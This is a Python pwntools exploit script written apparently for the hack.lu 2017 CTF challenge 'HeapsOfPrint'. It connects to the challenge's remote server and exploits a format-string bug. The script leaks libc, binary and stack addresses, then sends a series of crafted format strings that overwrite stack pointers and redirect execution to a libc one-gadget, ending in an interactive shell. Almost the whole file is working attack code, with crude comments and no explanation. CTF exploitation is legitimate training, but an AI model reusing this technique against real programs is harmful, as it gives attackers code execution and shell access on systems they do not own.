r"""I'm extremely proud of this code."""
from pwn import *
context.update(arch='amd64')

cwd = '/media/SSD2/dev/hx/ctf/hacklu17/heapsofprint'
bin_ = os.path.join(cwd, 'HeapsOfPrint')
b = ELF(bin_)
libc = ELF(os.path.join('/lib/x86_64-linux-gnu/libc.so.6'))

# TARGET = 'gdb'
TARGET = 'live'

execute = ['b printf', 'ignore 1 10', 'b execve', 'continue']
execute = flat(map(lambda x: x + '\n', execute))


def conn():
    if TARGET == 'gdb':
        env = os.environ.copy()
        r = process(bin_, aslr=False)
        gdb.attach(r, gdbscript=execute)
    elif TARGET == 'rr':
        def replay():
            pwnlib.util.misc.run_in_new_terminal('rr replay')
        r = process('rr record ' + bin_, shell=True)
        atexit.register(replay)
    elif TARGET == 'qira':
        # Start withsho
        # stdbuf -oO qira -s ./books_757b0a24b0193ec8989290ec6923dd1d
        r = remote('127.0.0.1', 4000)
    elif TARGET == 'naked':
        r = remote('localhost', 24242)
    else:
        r = remote('flatearth.fluxfingers.net', 1747)

    return r


p = conn()
leak = p.recvuntil('Is it?')
leak = u8(leak.split('character is ')[1].split(' (as in ')[0])
print 'leak: ', hex(leak)
saved_rbp_lsb = (leak + 1 + 8 + 48) & 0xff
looper = ((0x100 + saved_rbp_lsb) + 0x38 & 0xff)
print 'saved_rbp_lsb: ', hex(saved_rbp_lsb), 'target: ', looper

if looper < 5:
    raise 'sucky sucky'

fmt = '%2${}s'.format(looper) + \
      '%6$hhn' + \
      'ZZ%2$zxZZ' + \
      'YY%7$zxYY' + \
      'QQ%6$zxQQ' + \
      'OKGOOGLE'
p.sendline(fmt)
dicky = p.recvuntil('GOOGLE')
libc_leak = int(dicky.split('ZZ')[1], 16)
bin_leak = int(dicky.split('YY')[1], 16)
rbp_leak = int(dicky.split('QQ')[1], 16)

libc_base = libc_leak - 0x3c6790
bin_base = bin_leak - 0x8f0
b.address = bin_base
libc.address = libc_base

print hex(libc_leak), hex(bin_leak), hex(rbp_leak), hex(libc_base), hex(bin_base)
print dicky

# now that we have leaks from the interesting parts, let's rewrite free_hook to system
# which will be a bit tricky, first we build a pointer to it on the stack
# let's try to restart this shit one more time


def format_that_shit(targets):
    r"""expects (value, offset) tuples in an iterable"""
    def increase_out(n):
        return '%2$.{}u'.format(n)

    def write_f(val, off):
        formats = ['hhn', 'hn']
        return '%{}${}'.format(off, formats[int(math.log(val, 2)) // 8])

    outed = 0
    fmt = ''
    for t in sorted(targets, key=operator.itemgetter(0)):
        val = t[0] & 0xffff
        off = t[1]
        if val > outed:
            fmt += increase_out(val-outed)
            outed = val
        fmt += write_f(val, off)
        print t

    print fmt
    format_that_shit.cnt += 1
    return fmt

format_that_shit.cnt = 0
# iter2, create a pointer on the stack to a libc address on the stack
offsetof_ptr_to_stack = 51
offsetof_writer = 51 + 14

looper = rbp_leak + 0x48
ts = [
    (looper, 6),    # to loopit
    (rbp_leak + 194, offsetof_ptr_to_stack)
]
fmt = format_that_shit(ts)
print 'target: ', hex(looper)
fmt = fmt + '.'.join(['%{}$zx'.format(x) for x in range(50, 54)]) + 'GOOGLE'
print 'fmt: ', fmt
p.sendline(fmt)
resp = p.recvuntil('GOOGLE')
print resp

# iter3, overwrite the libc pointer created in the previous iteration to point to a one-gadget
one_gadget = libc.address + 0x4526a
looper = looper - 0x20
fmt = format_that_shit([
    (looper & 0xffff, 6),
    ((one_gadget >> 16) & 0xffff, 51 + 4 + 14)
])
print 'target: ', hex(looper)
print 'fmt: ', fmt
p.sendline(fmt)

# iter4, adjust the pointer
looper = looper - 0x20
fmt = format_that_shit([
    (looper, 6),    # to loopit
    (rbp_leak + 192, 51 + 8)
])
print 'target: ', hex(looper)
print 'fmt: ', fmt
p.sendline(fmt)

# iter5
looper = looper - 0x20
fmt = format_that_shit([
    (looper, 6),    # to loopit
    (one_gadget & 0xffff, 51 + 12 + 14)
])

print 'target: ', hex(looper)
print 'fmt: ', fmt
p.sendline(fmt)

offsetof_null = 59
print 'readjusting ptr'
# iter  adjust the ptr again
looper = looper - 0x20
fmt = format_that_shit([
    (looper, 6),    # to loopit
    (rbp_leak + 192 + 56, offsetof_ptr_to_stack + format_that_shit.cnt * 4)
])
print 'target: ', hex(looper)
print 'fmt: ', fmt
p.sendline(fmt)

looper = looper - 0x20
fmt = format_that_shit([
    (looper & 0xffff, 6),
])
fmt = '%{}$n'.format(85) + fmt
fmt = fmt + '.'.join(['%{}$zx'.format(x) for x in range(82, 95)]) + 'GOOGLE'
print 'target: ', hex(looper)
print 'fmt: ', fmt
p.sendline(fmt)
resp = p.recvuntil('GOOGLE')
print resp

print 'readjusting ptr'
# iter  adjust the ptr again
looper = looper - 0x20
fmt = format_that_shit([
    (looper, 6),    # to loopit
    (rbp_leak + 196 + 56, offsetof_ptr_to_stack + format_that_shit.cnt * 4)
])
print 'target: ', hex(looper)
print 'fmt: ', fmt
p.sendline(fmt)

looper = looper - 0x20
fmt = format_that_shit([
    (looper & 0xffff, 6),
])
fmt = '%{}$n'.format(85 + 8) + fmt
fmt = fmt + '.'.join(['%{}$zx'.format(x) for x in range(82, 95)]) + 'GOOGLE'
print 'target: ', hex(looper)
print 'fmt: ', fmt
p.sendline(fmt)
resp = p.recvuntil('GOOGLE')
print resp

#iterasdasd
fmt = format_that_shit([
    (rbp_leak + 192 - 8, 6),    # to loopit
])

print 'target: ', hex(looper)
fmt = fmt + '.'.join(['%{}$zx'.format(x) for x in range(66, 71)]) + 'GOOGLE'
print 'fmt: ', fmt
p.sendline(fmt)

p.interactive()